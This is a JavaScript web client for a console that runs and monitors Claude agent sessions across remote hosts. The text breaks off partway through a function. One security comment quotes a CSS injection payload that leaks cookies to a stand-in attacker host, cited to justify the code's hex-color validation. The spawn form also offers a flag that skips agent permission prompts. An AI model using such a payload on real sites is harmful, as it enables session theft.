'use strict';
// agent-fleet web client.
// Tactical command console. Vanilla JS, no framework. xterm.js for terminals.
(() => {
  const $ = (id) => document.getElementById(id);
  const state = {
    token: null,
    hosts: [],
    sessions: [],
    groups: [],           // [{id,name,description,color,host_ids}]
    cost: null,           // { days, hosts: [{host_id, host, usd, msgs}] }
    selected: null,       // session_id (when viewMode='session')
    selectedHost: null,   // host_id (when viewMode='host')
    viewMode: 'session',  // 'session' | 'host'
    ws: null,
    term: null,
    fit: null,
    pollTimer: null,
    backoff: 800,
  };

  // ============ Auth ============
  function readToken() {
    const frag = location.hash.match(/token=([^&]+)/);
    if (frag) {
      localStorage.fleetToken = decodeURIComponent(frag[1]);
      history.replaceState(null, '', location.pathname);
    }
    state.token = localStorage.fleetToken || null;
    // vt-0146/0147: vault.js + future tabs need the token + admin flag.
    if (state.token) {
      // Best-effort probe: hit an admin-only endpoint. 403 → viewer; anything
      // else (200, 422, 502, 503) → admin. Done in parallel; vault tab waits
      // on the global event.
      fetch('/api/fleet/dispatch', {
        method: 'POST',
        headers: { authorization: 'Bearer ' + state.token, 'content-type': 'application/json' },
        body: '{}',
      }).then(r => {
        state.isAdmin = r.status !== 403;
        window.dispatchEvent(new CustomEvent('fleet-token-ready', { detail: { token: state.token, isAdmin: state.isAdmin } }));
      }).catch(() => {
        state.isAdmin = false;
        window.dispatchEvent(new CustomEvent('fleet-token-ready', { detail: { token: state.token, isAdmin: false } }));
      });
    }
  }
  function showAuth() {
    $('auth').hidden = false; $('app').hidden = true;
    $('token-save').onclick = () => {
      const v = $('token-input').value.trim();
      if (v) { localStorage.fleetToken = v; location.reload(); }
    };
    $('token-input').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') $('token-save').click();
    });
    setTimeout(() => $('token-input').focus(), 50);
  }
  function showApp() {
    $('auth').hidden = true; $('app').hidden = false;
    $('logout').onclick = () => {
      if (!confirm('clear local token?')) return;
      localStorage.removeItem('fleetToken'); location.reload();
    };
  }

  // ============ API ============
  async function api(method, path, body) {
    const r = await fetch('/api/fleet' + path, {
      method, headers: {
        'authorization': 'Bearer ' + state.token,
        'content-type': 'application/json',
      },
      body: body ? JSON.stringify(body) : undefined,
    });
    if (r.status === 401) {
      localStorage.removeItem('fleetToken'); location.reload(); throw new Error('auth');
    }
    if (!r.ok) {
      const e = new Error(`${method} ${path}: ${r.status}`);
      e.status = r.status;
      try { e.body = await r.json(); } catch {}
      throw e;
    }
    if (r.status === 204) return null;
    return r.json();
  }

  // Optimistic-concurrency wrapper for group PATCH (vt-0087).
  // Returns updated row on success; on 409 conflict, alerts user, reloads
  // groups, and returns null so caller skips local mutation.
  async function patchGroupWithVersion(g, patch) {
    try {
      const updated = await api('PATCH', '/groups/' + g.id, { ...patch, expected_version: g.version });
      g.version = updated.version;
      return updated;
    } catch (e) {
      if (e.status === 409 && e.body && e.body.current) {
        alert('group was edited in another tab — reloading');
        loadGroups();
        return null;
      }
      throw e;
    }
  }

  // ============ Render ============
  function ageStr(iso) {
    if (!iso) return '—';
    const d = (Date.now() - new Date(iso).getTime()) / 1000;
    if (d < 60) return `${Math.floor(d)}s`;
    if (d < 3600) return `${Math.floor(d/60)}m`;
    if (d < 86400) return `${Math.floor(d/3600)}h${Math.floor((d%3600)/60).toString().padStart(2,'0')}`;
    return `${Math.floor(d/86400)}d`;
  }
  function humanSeconds(s) {
    s = Math.max(0, Math.floor(Number(s) || 0));
    const d = Math.floor(s / 86400); s %= 86400;
    const h = Math.floor(s / 3600);  s %= 3600;
    const m = Math.floor(s / 60);
    const parts = [];
    if (d) parts.push(d + 'd');
    if (h) parts.push(h + 'h');
    if (m && !d) parts.push(m + 'm');
    if (!parts.length) parts.push((s % 60) + 's');
    return parts.join(' ');
  }
  function esc(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
  // vt-0182: validate a CSS color string before embedding into inline
  // style="...". esc() is HTML-attr safe but NOT CSS-safe — `red;
  // background-image:url(//attacker/${cookie})` would render and leak.
  // Accept only #rgb/#rgba/#rrggbb/#rrggbbaa. Reject everything else
  // (server should already validate, but defense-in-depth).
  function safeCssColor(s) {
    return /^#[0-9a-fA-F]{3,8}$/.test(String(s || '')) ? s : null;
  }
  function dotClass(status, kind) {
    if (kind === 'host') return status === 'online' ? 'on' : 'off';
    if (status === 'running') return 'on';
    if (status === 'orphaned' || status === 'pending') return 'warn';
    if (status === 'killed') return 'err';
    return 'off';
  }
  function short(id) { return id ? id.slice(0, 8) : '—'; }

  function render() {
    const online = state.hosts.filter(h => h.status === 'online').length;
    const active = state.sessions.filter(s => s.status === 'running').length;
    $('stat-hosts').textContent = state.hosts.length || '0';
    $('stat-online').textContent = online || '0';
    $('stat-active').textContent = active || '0';
    $('hosts-count').textContent = state.hosts.length;
    $('sessions-count').textContent = state.sessions.length;

    const hostsUl = $('hosts');
    const costByHost = {};
    if (state.cost) for (const h of state.cost.hosts) costByHost[h.host_id] = h.usd;
    hostsUl.innerHTML = state.hosts.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="host-name" style="color:var(--text-faint)">no hosts registered</span></li>`
      : state.hosts.map(h => {
          const n = state.sessions.filter(s => s.host_id === h.id && s.status === 'running').length;
          const cost = costByHost[h.id];
          const costStr = (cost != null) ? `$${cost.toFixed(2)}` : '—';
          const label = h.display_name || h.name;
          const active = (state.viewMode === 'host' && h.id === state.selectedHost) ? ' class="active"' : '';
          return `<li data-host="${h.id}"${active}>
            <span class="dot ${dotClass(h.status, 'host')}"></span>
            <span class="host-name">${esc(label)} <span class="host-count">· ${costStr}/7d</span></span>
            <span class="host-actions">
              <span class="host-count">${n} sess</span>
            </span>
          </li>`;
        }).join('');
    hostsUl.querySelectorAll('li[data-host]').forEach(li => {
      li.onclick = () => openHostDetail(li.dataset.host);
    });

    const sessUl = $('sessions');
    const showClosed = $('show-closed')?.checked;
    const sessVisible = state.sessions.filter(s => showClosed || (s.status !== 'exited' && s.status !== 'killed'));
    sessUl.innerHTML = sessVisible.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="sess-id" style="color:var(--text-faint)">no ${showClosed?'':'active '}sessions</span><span></span><span></span></li>`
      : sessVisible.slice(0, 40).map(s => {
          const host = state.hosts.find(h => h.id === s.host_id);
          const active = (state.viewMode === 'session' && s.id === state.selected) ? ' class="active"' : '';
          return `<li data-session="${s.id}"${active}>
            <span class="dot ${dotClass(s.status, 'session')}"></span>
            <span class="sess-id">${short(s.id)}</span>
            <span class="sess-host">${esc(host?.display_name || host?.name || '?')}</span>
            <span class="sess-age">${ageStr(s.started_at)}</span>
          </li>`;
        }).join('');

    // wire clicks
    sessUl.querySelectorAll('li[data-session]').forEach(li => {
      li.onclick = () => attachSession(li.dataset.session);
    });

    // spawn host options
    const hostSel = $('spawn-host');
    const cur = hostSel.value;
    hostSel.innerHTML = state.hosts
      .filter(h => h.status === 'online')
      .map(h => `<option value="${h.id}">${esc(h.display_name || h.name)}</option>`).join('')
      || `<option value="">no online hosts</option>`;
    if (cur && [...hostSel.options].some(o => o.value === cur)) hostSel.value = cur;

    const grpSel = $('spawn-group');
    if (grpSel) {
      const cur2 = grpSel.value;
      grpSel.innerHTML = '<option value="">(by tag instead)</option>' +
        state.groups.map(g => `<option value="${g.id}">${esc(g.name)}</option>`).join('');
      if (cur2 && [...grpSel.options].some(o => o.value === cur2)) grpSel.value = cur2;
    }

    // footbar
    $('footstat').textContent = `${state.hosts.length} hosts · ${state.sessions.length} sessions · ${active} active`;
  }

  // ============ Poll ============
  async function refresh() {
    try {
      const [hosts, sessions, groups] = await Promise.all([
        api('GET', '/hosts'), api('GET', '/sessions'), api('GET', '/groups'),
      ]);
      state.hosts = hosts;
      state.sessions = sessions;
      state.groups = groups;
      // cost is best-effort (503 if tokmon down); don't break refresh
      try {
        const cost = await api('GET', '/cost/summary?days=7');
        state.cost = cost;
        const total = cost.hosts.reduce((n, h) => n + (h.usd || 0), 0);
        $('stat-cost').textContent = `$${total.toFixed(2)}`;
      } catch (e) {
        state.cost = null;
        $('stat-cost').textContent = '—';
      }
      render();
      // vt-0110: pending approvals — best-effort, hidden if none.
      try { renderApprovals(await api('GET', '/workflow-pending-approvals')); }
      catch {}
      // vt-0115: docker stack health dot.
      try { renderStackStatus(await api('GET', '/stack-status')); }
      catch (e) { renderStackStatus({ services: [], error: e.message }); }
    } catch (e) {
      if (e.message !== 'auth') console.warn('refresh', e);
    }
  }
  // vt-0115: compute green/yellow/red from per-service health.
  function summarizeStack(payload) {
    if (payload.error || !payload.services) return 'unknown';
    if (payload.stale) return 'yellow';
    let badCount = 0, healthy = 0;
    for (const s of payload.services) {
      // Skip the api container itself — it always reports healthy when we can
      // read the file, otherwise the route already 503'd above.
      if (s.name === 'vault-rag-api') continue;
      if (s.status === 'running' && (s.health === 'healthy' || s.health === 'none')) healthy++;
      else badCount++;
    }
    if (badCount === 0) return 'green';
    if (badCount === 1) return 'yellow';
    return 'red';
  }
  function renderStackStatus(payload) {
    const dot = $('stack-dot');
    if (!dot) return;
    const state = summarizeStack(payload);
    dot.dataset.state = state;
    dot.title = state === 'green'   ? 'all containers healthy'
              : state === 'yellow'  ? 'one container degraded or status stale'
              : state === 'red'     ? 'multiple containers unhealthy'
              : 'stack status unavailable';
    state._cached = payload;
    dot.onclick = () => openStackModal(payload);
  }
  function openStackModal(payload) {
    const modal = $('stack-modal');
    if (!modal) return;
    modal.hidden = false;
    const rows = (payload.services || []).map(s => {
      const ok = s.status === 'running' && (s.health === 'healthy' || s.health === 'none');
      const ago = s.started_at ? relAgo(new Date(s.started_at).getTime()) : '—';
      return `<tr>
        <td>${esc(s.name)}</td>
        <td class="${ok ? 'val-ok' : 'val-danger'}">${esc(s.status)}${s.health && s.health !== 'none' ? ' / ' + esc(s.health) : ''}</td>
        <td>${ago}</td>
        <td>${s.restarts}</td>
      </tr>`;
    }).join('');
    const updated = payload.updated_at ? relAgo(new Date(payload.updated_at).getTime()) : '—';
    modal.innerHTML = `
      <div class="gd-frame" style="width:560px">
        <div class="gd-head">
          <span class="display" style="font-size:1.1em">DOCKER STACK</span>
          <span class="lbl" style="margin-left:1em">updated ${esc(updated)}${payload.stale ? ' · STALE' : ''}</span>
          <span style="flex:1"></span>
          <button class="btn-ghost" data-close>× close</button>
        </div>
        <div class="gd-body">
          ${payload.error ? `<p class="val-danger">${esc(payload.error)}</p>` : ''}
          <table class="archive-table">
            <thead><tr><th>name</th><th>status</th><th>uptime</th><th>restarts</th></tr></thead>
            <tbody>${rows || '<tr><td colspan="4" style="text-align:center; color:var(--text-faint)">no services reported</td></tr>'}</tbody>
          </table>
        </div>
      </div>
    `;
    modal.querySelector('[data-close]').onclick = () => { modal.hidden = true; };
  }
  function relAgo(ts) {
    const ms = Date.now() - ts;
    if (ms < 0) return new Date(ts).toLocaleString();
    const s = Math.floor(ms / 1000);
    if (s < 60)    return s + 's ago';
    if (s < 3600)  return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    return Math.floor(s / 86400) + 'd ago';
  }

  function renderApprovals(rows) {
    const panel = $('approvals-panel');
    const list = $('approvals-list');
    const countEl = $('approvals-count');
    if (!panel || !list) return;
    if (!rows || !rows.length) { panel.hidden = true; return; }
    panel.hidden = false;
    countEl.textContent = String(rows.length);
    list.innerHTML = rows.map(r => `
      <li class="approval-row" data-run="${esc(r.run_id)}" data-node="${esc(r.node_id)}">
        <div class="approval-head">
          <strong>${esc(r.workflow_name || r.run_id.slice(0, 8))}</strong>
          <span class="lbl">/${esc(r.node_id)}</span>
        </div>
        ${r.reason ? `<div class="approval-reason">${esc(r.reason)}</div>` : ''}
        <div class="approval-btns">
          <button class="btn-row" data-action="approve">approve</button>
          <button class="btn-row" data-action="reject">reject</button>
        </div>
      </li>`).join('');
    list.querySelectorAll('li.approval-row').forEach(li => {
      li.querySelectorAll('[data-action]').forEach(btn => {
        btn.onclick = async (ev) => {
          ev.stopPropagation();
          const decision = btn.dataset.action;
          try {
            await api('POST', `/workflow-runs/${li.dataset.run}/approvals/${li.dataset.node}`,
              { decision, by: 'web' });
            refresh();
          } catch (e) { alert(`approval failed: ${e.message}`); }
        };
      });
    });
  }
  function startPolling() {
    refresh();
    state.pollTimer = setInterval(refresh, 5000);
  }

  // ============ Terminal + WS ============
  function setViewerStatus(s) {
    const map = { running: 'val-ok', exited: '', killed: 'val-danger', orphaned: 'val-warn', pending: 'val-warn', reconnecting: 'val-warn' };
    const el = $('v-status');
    el.textContent = s || 'idle';
    el.className = 'val ' + (map[s] || '');
    state.viewerStatusValue = s;
    // Dim terminal during reconnect so the freeze is visually obvious.
    const tf = document.querySelector('.term-frame');
    if (tf) tf.classList.toggle('term-reconnecting', s === 'reconnecting');
  }
  function setOverlay(visible, msg, sub) {
    const o = $('term-overlay');
    if (visible) {
      $('ovl-msg').textContent = msg || '—';
      o.hidden = false;
    } else {
      o.hidden = true;
    }
  }

  function setViewMode(mode) {
    state.viewMode = mode;
    document.querySelector('.viewer').hidden = (mode !== 'session');
    document.querySelector('.host-detail').hidden = (mode !== 'host');
    // R10: when leaving session view, stop polling cost for the now-hidden
    // session — otherwise it runs forever until next attachSession() call.
    if (mode !== 'session' && state.sessionCostTimer) {
      clearInterval(state.sessionCostTimer);
      state.sessionCostTimer = null;
    }
  }

  function attachSession(id) {
    if (state.ws) { try { state.ws.close(); } catch {} state.ws = null; }
    if (state.term) { try { state.term.dispose(); } catch {} state.term = null; }
    if (state.sessionCostTimer) { clearInterval(state.sessionCostTimer); state.sessionCostTimer = null; }
    if (state.ro) { try { state.ro.disconnect(); } catch {} state.ro = null; }
    state.selected = id;
    state.selectedHost = null;
    setViewMode('session');
    document.querySelector('.viewer').classList.remove('exited');
    render();

    $('v-id').textContent = short(id);
    $('v-host').textContent = '…';
    $('v-cwd').textContent = '…';
    $('v-cost').textContent = '—';
    setViewerStatus('attaching');
    setOverlay(false);

    // Per-session cost: refresh every 10s while attached
    const refreshSessCost = async () => {
      try {
        const c = await api('GET', `/sessions/${id}/cost`);
        const usd = (c.usd || 0).toFixed(4);
        const tag = c.attribution === 'approximate' ? ' ~' : '';
        let tip = `attribution: ${c.attribution || 'unknown'}`;
        if (c.by_model) {
          for (const [m, v] of Object.entries(c.by_model)) {
            tip += `\n${m}: $${v.usd.toFixed(4)} (${v.msgs} msgs, in=${v.input_tokens}, out=${v.output_tokens}, cache_w=${v.cache_creation_5m}, cache_r=${v.cache_read})`;
          }
        }
        const el = $('v-cost');
        el.textContent = `$${usd}${tag} · ${c.msgs} msgs`;
        el.title = tip;
      } catch { $('v-cost').textContent = '—'; }
    };
    refreshSessCost();
    state.sessionCostTimer = setInterval(refreshSessCost, 10_000);

    $('v-kill').disabled = false;
    $('v-kill').onclick = async () => {
      if (!confirm('terminate this session?')) return;
      try { await api('POST', `/sessions/${id}/kill`, {}); } catch (e) { alert(e.message); }
    };

    const term = new Terminal({
      cursorBlink: true,
      fontFamily: '"JetBrains Mono", ui-monospace, monospace',
      fontSize: 13,
      lineHeight: 1.25,
      scrollback: 5000,
      // batch terminal writes for throughput; default is too eager for fast claude output
      windowsMode: false,
      convertEol: false,
      theme: {
        background: '#0a0a0c',
        foreground: '#e8e6e1',
        cursor: '#5cf08c',
        cursorAccent: '#0a0a0c',
        black: '#0a0a0c',     brightBlack:   '#5a5550',
        red:   '#ff4d5e',     brightRed:     '#ff7d8b',
        green: '#5cf08c',     brightGreen:   '#86ffac',
        yellow:'#ffb547',     brightYellow:  '#ffd07a',
        blue:  '#6fd5ff',     brightBlue:    '#9be4ff',
        magenta:'#ff79c6',    brightMagenta: '#ffaae0',
        cyan:  '#8be9fd',     brightCyan:    '#bbf3ff',
        white: '#e8e6e1',     brightWhite:   '#ffffff',
      },
      allowProposedApi: true,
    });
    const fit = new FitAddon.FitAddon();
    term.loadAddon(fit);
    term.open($('term'));
    // Canvas renderer: ~5-10× faster than DOM for bursty TUI output (claude).
    try {
      if (window.CanvasAddon && CanvasAddon.CanvasAddon) {
        term.loadAddon(new CanvasAddon.CanvasAddon());
      }
    } catch (e) { console.warn('canvas addon failed, falling back to DOM:', e); }
    // Unicode 11 widths: correct emoji + CJK + box-drawing column counts
    // (xterm default is unicode 6, which mis-widths modern emoji).
    try {
      if (window.Unicode11Addon && Unicode11Addon.Unicode11Addon) {
        term.loadAddon(new Unicode11Addon.Unicode11Addon());
        term.unicode.activeVersion = '11';
      }
    } catch (e) { console.warn('unicode11 addon failed:', e); }
    state.term = term; state.fit = fit;
    // Defer fit until the container has real dimensions (layout flush after
    // viewer became visible). Otherwise FitAddon falls back to cols=1, which
    // resizes the PTY → claude renders ultra-narrow. Retry until container
    // is at least 40 cols wide or we give up.
    function attemptFit(retries = 12) {
      const el = $('term');
      if (!el || el.clientWidth < 50 || el.clientHeight < 40) {
        if (retries > 0) return requestAnimationFrame(() => attemptFit(retries - 1));
        return;
      }
      try {
        fit.fit();
        if (term.cols >= 40) { sendResize(); return; }
      } catch {}
      if (retries > 0) requestAnimationFrame(() => attemptFit(retries - 1));
    }
    requestAnimationFrame(() => attemptFit());

    // Debounce resize observer; rapid fires were causing layout thrash.
    let resizeT = null;
    const ro = new ResizeObserver(() => {
      clearTimeout(resizeT);
      resizeT = setTimeout(() => {
        try {
          fit.fit();
          if (term.cols >= 40) sendResize();
        } catch {}
      }, 120);
    });
    ro.observe($('term'));
    state.ro = ro;

    term.onData(d => {
      if (state.ws && state.ws.readyState === 1) {
        state.ws.send(JSON.stringify({ type: 'input', data: d }));
      }
    });
    // Intercept browser-stealing shortcuts (Ctrl+O = Open File, Ctrl+S = Save,
    // Ctrl+R = Reload). Forward them to PTY as the corresponding ASCII control
    // characters so claude's TUI (expand tool output, etc.) actually receives them.
    term.attachCustomKeyEventHandler((e) => {
      if (e.type !== 'keydown') return true;
      if (!(e.ctrlKey || e.metaKey) || e.altKey || e.shiftKey) return true;
      const key = e.key.toLowerCase();
      const map = { o: '\x0f', s: '\x13', r: '\x12', q: '\x11', p: '\x10' };
      const code = map[key];
      if (!code) return true;
      e.preventDefault();
      e.stopPropagation();
      if (state.ws && state.ws.readyState === 1) {
        state.ws.send(JSON.stringify({ type: 'input', data: code }));
      }
      return false;
    });

    connectWs(id);
  }
  function sendResize() {
    if (!state.term || !state.ws || state.ws.readyState !== 1) return;
    // Guard against undersized fit results (eg container was 0px during attach).
    // Refuse to send a PTY size that would make claude wrap to one char per line.
    const cols = Math.max(state.term.cols || 0, 80);
    const rows = Math.max(state.term.rows || 0, 24);
    state.ws.send(JSON.stringify({ type: 'resize', cols, rows }));
  }

  // vt-0136: short-lived signed ticket replaces bearer-in-subprotocol so the
  // raw token no longer lands in DevTools / reverse-proxy logs. Falls back to
  // legacy bearer.<token> if the server doesn't ship the ws-ticket endpoint
  // yet (rolling upgrade).
  async function fetchWsTicket(role = 'viewer') {
    try {
      const r = await fetch('/api/fleet/auth/ws-ticket', {
        method: 'POST',
        headers: { 'authorization': 'Bearer ' + state.token, 'content-type': 'application/json' },
        body: JSON.stringify({ role }),
      });
      if (!r.ok) return null;
      const j = await r.json();
      return j.ticket || null;
    } catch { return null; }
  }

  async function connectWs(id) {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${proto}//${location.host}/api/fleet/ws?role=viewer&session_id=${id}`;
    const ticket = await fetchWsTicket('viewer');
    const subProto = ticket ? ['ticket.' + ticket] : ['bearer.' + state.token];
    const ws = new WebSocket(url, subProto);
    state.ws = ws;
    ws.onopen = () => {
      state.backoff = 800;
      // If we were in reconnecting mode, clear the dim. Real status will arrive
      // via the 'hello' frame; meanwhile show 'attaching' as transient.
      if (state.viewerStatusValue === 'reconnecting') setViewerStatus('attaching');
    };
    // Coalesce rapid pty_data frames into one term.write per animation frame.
    // The default per-frame write was the bottleneck on bursty claude output.
    let pendingChunks = [];
    let rafScheduled = false;
    let receivedAnyData = false;
    const flushPending = () => {
      rafScheduled = false;
      if (!pendingChunks.length || !state.term) return;
      let total = 0;
      for (const c of pendingChunks) total += c.length;
      const merged = new Uint8Array(total);
      let o = 0;
      for (const c of pendingChunks) { merged.set(c, o); o += c.length; }
      pendingChunks = [];
      try { state.term.write(merged); } catch (e) { console.warn('term.write failed', e); }
    };
    const writeChunk = (u8) => {
      if (u8.length > 0) receivedAnyData = true;
      pendingChunks.push(u8);
      if (!rafScheduled) {
        rafScheduled = true;
        requestAnimationFrame(flushPending);
      }
    };

    ws.onmessage = (e) => {
      let f;
      try { f = JSON.parse(e.data); } catch { return; }
      if (f.type === 'hello') {
        const host = state.hosts.find(h => h.id === f.host_id);
        $('v-host').textContent = host?.display_name || host?.name || short(f.host_id);
        $('v-cwd').textContent = f.cwd || '—';
        setViewerStatus(f.status);
      } else if (f.type === 'backfill') {
        try { state.term.reset?.(); } catch {}
        writeChunk(b64ToBytes(f.data));
        // Force claude (Ink) to redraw at the viewer's actual dimensions by
        // sending two resize events: cols+1, then cols. SIGWINCH twice
        // typically causes Ink to do a full screen re-render, which paints
        // over any mis-positioned content from the historical backfill.
        if (state.viewerStatusValue === 'running' || state.viewerStatusValue === 'pending') {
          setTimeout(() => {
            try {
              if (!state.term || !state.ws || state.ws.readyState !== 1) return;
              const cols = Math.max(state.term.cols || 80, 80);
              const rows = Math.max(state.term.rows || 24, 24);
              state.ws.send(JSON.stringify({ type: 'resize', cols: cols + 1, rows }));
              setTimeout(() => {
                try {
                  state.ws.send(JSON.stringify({ type: 'resize', cols, rows }));
                  state.ws.send(JSON.stringify({ type: 'input', data: '\x0c' }));
                } catch {}
              }, 80);
            } catch {}
          }, 100);
        }
      } else if (f.type === 'pty_data') {
        writeChunk(b64ToBytes(f.data));
      } else if (f.type === 'session_exit') {
        document.querySelector('.viewer').classList.add('exited');
        setViewerStatus(f.exit_code === 0 ? 'exited' : 'killed');
        // Flush any pending writes before adding the exit marker so order is right.
        try { flushPending(); } catch {}
        try {
          if (!receivedAnyData) {
            state.term.write('\x1b[2m─── (no transcript captured for this session — likely a legacy run before persisted-flush) ───\x1b[0m\r\n');
          }
          state.term.write(`\r\n\x1b[2m─── session exit code=${f.exit_code} ───\x1b[0m\r\n`);
        } catch {}
      } else if (f.type === 'session_started') {
        setViewerStatus('running');
      }
    };
    ws.onclose = (ev) => {
      if (ev.code === 4001) {
        localStorage.removeItem('fleetToken'); location.reload(); return;
      }
      if (state.selected === id) {
        // Don't override terminal-state-flagged statuses with 'reconnecting'.
        const v = state.viewerStatusValue;
        if (v !== 'exited' && v !== 'killed') setViewerStatus('reconnecting');
        const wait = Math.min(state.backoff *= 1.7, 8000);
        setTimeout(() => connectWs(id), wait);
      } else {
        state.backoff = 800;
      }
    };
    ws.onerror = () => { /* let close handler retry */ };
  }
  function b64ToBytes(b64) {
    const bin = atob(b64);
    const u = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) u[i] = bin.charCodeAt(i);
    return u;
  }

  // ============ Spawn ============
  function parseArgs(s) {
    if (!s) return [];
    const out = []; const re = /'([^']*)'|"([^"]*)"|(\S+)/g;
    let m; while ((m = re.exec(s))) out.push(m[1] ?? m[2] ?? m[3]);
    return out;
  }
  // Build claude CLI argv from the spawn form.
  // Order: explicit flags first, then user-provided extras (so extras can override).
  function buildSpawnArgs(extras) {
    const model    = $('spawn-model').value.trim();
    const system   = $('spawn-system').value.trim();
    const tools    = $('spawn-tools').value.trim();
    const resume   = $('spawn-resume').value.trim();
    const danger   = $('spawn-dangerous').checked;
    const args = [];
    if (model)  args.push('--model', model);
    if (system) args.push('--append-system-prompt', system);
    if (tools)  args.push('--allowed-tools', tools);
    if (resume) args.push('--resume', resume);
    if (danger) args.push('--dangerously-skip-permissions');
    return args.concat(extras);
  }
  async function spawn() {
    const btn = $('spawn-btn');
    if (btn.disabled) return; // R5: ignore rapid re-fires while a spawn is in flight
    const host_id = $('spawn-host').value;
    if (!host_id) { alert('no host selected'); return; }
    const cwd = $('spawn-cwd').value || '~';
    const prompt = $('spawn-prompt').value;
    // vt-0102: send generic spawn payload. Server forwards structured fields
    // to the daemon, which picks the backend (vt-0096) and builds argv there.
    // Falls back to legacy args-passthrough if user typed extras in ARGS.
    const body = {
      host_id, cwd,
      agent: ($('spawn-agent') && $('spawn-agent').value) || 'claude',
      model:             $('spawn-model').value.trim() || undefined,
      system_prompt:     $('spawn-system').value.trim() || undefined,
      allowed_tools:     $('spawn-tools').value.trim()  || undefined,
      resume_session_id: $('spawn-resume').value.trim() || undefined,
      dangerous:         $('spawn-dangerous').checked || undefined,
      args:              parseArgs($('spawn-args').value),
    };
    btn.disabled = true;
    try {
      const r = await api('POST', '/sessions', body);
      await refresh();
      attachSession(r.session_id);
      // Prompt is sent over PTY stdin once daemon reports session running.
      if (prompt) sendPromptOnReady(r.session_id, prompt);
    } catch (e) {
      alert('spawn failed: ' + e.message);
    } finally {
      btn.disabled = false;
    }
  }
  async function sendPromptOnReady(sessionId, prompt) {
    const deadline = Date.now() + 5000;
    while (Date.now() < deadline) {
      try {
        const s = await api('GET', '/sessions/' + sessionId);
        if (s.status === 'running') {
          // Append newline so claude submits the prompt as a complete line.
          await api('POST', `/sessions/${sessionId}/input`, { data: prompt + '\n' });
          return;
        }
        if (s.status === 'exited' || s.status === 'killed') return;
      } catch {}
      await new Promise(r => setTimeout(r, 200));
    }
  }
  function wireSpawn() {
    $('spawn-btn').onclick = spawn;
    $('spawn-args').addEventListener('keydown', (e) => {
      if (e.key === 'Enter') spawn();
    });
    $('show-closed').addEventListener('change', render);
    $('cleanup-btn').onclick = async () => {
      const cb = $('cleanup-btn');
      if (cb.disabled) return;
      if (!confirm('delete all exited/killed sessions older than 1h? this is permanent.')) return;
      cb.disabled = true;
      try {
        const r = await api('POST', '/sessions/cleanup', { older_than: '1 hour' });
        await refresh();
        alert(`deleted ${r.deleted} session(s)`);
      } catch (e) { alert('cleanup failed: ' + e.message); }
      finally { cb.disabled = false; }
    };
    $('bcast-btn').onclick = async () => {
      const bb = $('bcast-btn');
      if (bb.disabled) return;
      const tag = $('spawn-tag').value.trim();
      const groupId = $('spawn-group').value;
      const groupName = groupId ? state.groups.find(g => g.id === groupId)?.name : null;
      if (!tag && !groupName) { alert('group or tag required'); return; }
      const cwd = $('spawn-cwd').value || '~';
      const args = parseArgs($('spawn-args').value);
      const body = { cwd, args, label: 'bcast:' + (groupName || tag) };
      if (groupName) body.group = groupName; else body.tag = tag;
      bb.disabled = true;
      try {
        const r = await api('POST', '/broadcast', body);
        await refresh();
        alert(`spawned ${r.count} sessions${r.results.some(x => !x.ok) ? ' (some failed, see console)' : ''}`);
        console.log('broadcast results:', r.results);
      } catch (e) { alert('broadcast failed: ' + e.message); }
      finally { bb.disabled = false; }
    };
  }

  // ============ Host detail ============
  function openHostDetail(hostId) {
    const h = state.hosts.find(x => x.id === hostId);
    if (!h) return;
    state.selectedHost = hostId;
    state.selected = null;
    setViewMode('host');
    render();
    renderHostDetail(h);
  }

  function renderHostDetail(h) {
    $('hd-display').textContent = h.display_name || h.name;
    $('hd-name').textContent = h.name;
    $('hd-os').textContent = h.os || '—';
    $('hd-arch').textContent = h.arch || '—';
    $('hd-status').textContent = h.status;
    $('hd-status').className = 'val ' + (h.status === 'online' ? 'val-ok' : 'val-danger');
    $('hd-dver').textContent = h.daemon_version || '—';
    $('hd-cver').textContent = h.claude_version || '—';
    $('hd-seen').textContent = h.last_seen ? ageStr(h.last_seen) + ' ago' : '—';
    const meta = h.metadata || {};
    $('hd-node').textContent = meta.node_version || '—';
    $('hd-cpu').textContent = meta.cpu_model || '—';
    $('hd-cores').textContent = meta.cpu_cores || '—';
    $('hd-ram').textContent = meta.ram_total_bytes
      ? `${(meta.ram_total_bytes / 1024 ** 3).toFixed(1)} GiB` + (meta.ram_free_bytes ? ` (${(meta.ram_free_bytes / 1024 ** 3).toFixed(1)} free)` : '')
      : '—';
    $('hd-uptime').textContent = meta.uptime_seconds
      ? humanSeconds(meta.uptime_seconds) : '—';
    $('hd-hostname').textContent = meta.hostname || '—';

    // tags
    const tagsEl = $('hd-tags');
    const caps = h.capabilities || [];
    tagsEl.innerHTML = caps.length === 0
      ? `<span class="lbl" style="color:var(--text-faint)">no tags</span>`
      : caps.map((c, i) => `<span class="chip">${esc(c)}<button data-rm-tag="${i}">×</button></span>`).join('');
    tagsEl.querySelectorAll('button[data-rm-tag]').forEach(btn => {
      btn.onclick = async () => {
        const newCaps = caps.filter((_, i) => i !== Number(btn.dataset.rmTag));
        await patchHost(h.id, { capabilities: newCaps });
      };
    });

    // sessions for this host
    const ul = $('hd-sessions');
    const list = state.sessions.filter(s => s.host_id === h.id).slice(0, 20);
    ul.innerHTML = list.length === 0
      ? `<li class="empty"><span class="dot off"></span><span class="sess-id" style="color:var(--text-faint)">no sessions</span><span></span><span></span></li>`
      : list.map(s => {
          const icon = { running:'▶', exited:'◇', killed:'✕', orphaned:'?', pending:'·' }[s.status] || '·';
          return `<li data-session="${s.id}">
            <span class="dot ${dotClass(s.status, 'session')}"></span>
            <span class="sess-id">${icon} ${short(s.id)}</span>
            <span class="sess-host">${s.status}</span>
            <span class="sess-age">${ageStr(s.started_at)}</span>
          </li>`;
        }).join('');
    ul.querySelectorAll('li[data-session]').forEach(li => {
      li.onclick = () => attachSession(li.dataset.session);
    });

    // vt-0150: per-agent edit buttons — one per installed backend.
    renderHostEditButtons(h);
    $('hd-close-detail').onclick = () => {
      if (window.stopHostMetrics) window.stopHostMetrics();
      state.selectedHost = null;
      setViewMode('session');
      render();
    };
    // editable display_name
    $('hd-display').onblur = async () => {
      const v = $('hd-display').textContent.trim();
      if (v === (h.display_name || h.name)) return;
